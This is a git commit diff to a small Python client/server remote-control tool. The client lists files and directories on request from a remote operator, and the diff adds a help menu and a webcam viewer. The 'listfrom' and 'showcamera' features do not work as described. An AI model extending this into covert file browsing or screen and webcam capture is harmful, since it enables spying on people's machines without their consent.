f22b4e32151a636c064e17bf874ea8bd2187e202
_thread90 <39356292+thread90@users.noreply.github.com>
2021-02-20 09:31:58 -0600

    + Connection via IPv4/Hostname, + New commands
    Use "help" to see the new commands

--- client.py
+++ client.py
@@ -1,17 +1,19 @@
 import os
 import socket
 import pyscreenshot
+import sys
 
 # Connect to server
 sock = socket.socket()
 host = input(str("Input server address: ")) # To automatically connect, port foward and assign to the host
-port = 5000
+port = 25565
 
 try:
     sock.connect((host, port))
     print("Success: connected to server")
 except OSError:
     print("Host not found")
+    sys.exit()
 
 # Commands
 ss_num = 0
@@ -24,5 +26,11 @@ while True:
         files = os.listdir()
         sock.send(str(files).encode())
     
+    elif command == "listfrom":
+        fromdir = sock.recv(5000)
+        fromdir = fromdir.decode()
+        files = os.listdir(fromdir)
+        sock.send(str(files).encode())
+
     if command == "endsession":
         sock.close()
--- server.py
+++ server.py
@@ -7,12 +7,16 @@ import os
 import sys
 import socket
 import pyscreenshot
+import tkinter
 
-sock = socket.socket()
-host = socket.gethostname()
+#host = socket.gethostname()
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+host = socket.gethostbyname(socket.gethostname())
 opensocket = True
-port = 5000
+
+port = 25565
 ss_num = 0
+w_num = 0
 
 # Cool ascii art
 print('''
@@ -46,8 +50,27 @@ def add_command(command):
 
 while opensocket:
     command = input(str("cmd > "))
-    if command == "list":
+    if command == "help":
+        add_command("help")
+        print('''
+        COMMANDS:
+        - list: prints all files listed in the current directory
+        - listfrom: prints all files listed in a specified directory
+        - screenshot: takes a screenshot and saves it to current directory
+        - help: shows a list of commands
+        - endsession: closes sockets and client/server
+        - showcamera: show a live feed of the webcam
+        ''')
+
+    elif command == "list":
         add_command("list")
+        files = connection.recv(5000)
+        files = files.decode()
+        print(files)
+
+    elif command == "listfrom":
+        add_command("listfrom")
+        fromdir = input(str("What directory would you like to list the files from? "))
         files = connection.recv(5000)
         files = files.decode()
         print(files)
@@ -63,16 +86,46 @@ while opensocket:
         add_command("endsession")
         opensocket = False
         sock.close()
+        
+    elif command == "showcamera":
+        add_command("showcamera")
+        print("Showing live webcam")
+        import tkinter as tk
+        import cv2
+        from PIL import Image, ImageTk
 
-    elif command == "help":
-        add_command("help")
-        print('''
-        COMMANDS:
-        - list: prints all files listed in directory
-        - screenshot: takes a screenshot and saves it to current directory
-        - help: shows a list of commands
-        - endsession: closes sockets and client/server
-        ''')
+        width, height = 800, 600
+        cap = cv2.VideoCapture(0)
+        if not cap.isOpened():
+            raise Exception("Could not open video device")
+        cap.set(cv2.CAP_PROP_FRAME_WIDTH, width)
+        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, height)
+
+        def ss_press():
+            global w_num
+            ret, img = cap.read()
+            cv2.imwrite('webcam_'+str(w_num)+'.png', img)
+            w_num += 1
+
+        root = tk.Tk()
+        root.title("Webcam for " + str(address))
+        lmain = tk.Label(root)
+        lmain.pack()
+        tk.Button(root, text="Close", command=root.destroy).pack()
+        tk.Button(root, text="Screenshot", command=lambda: ss_press()).pack()
+
+        def show_frame():
+            _, frame = cap.read()
+            frame = cv2.flip(frame, 1)
+            cv2image = cv2.cvtColor(frame, cv2.COLOR_BGR2RGBA)
+            img = Image.fromarray(cv2image)
+            imgtk = ImageTk.PhotoImage(image=img)
+            lmain.imgtk = imgtk
+            lmain.configure(image=imgtk)
+            lmain.after(10, show_frame)
+
+        show_frame()
+        root.mainloop()
 
     else:
         print("Sorry, " + command + " was not found")
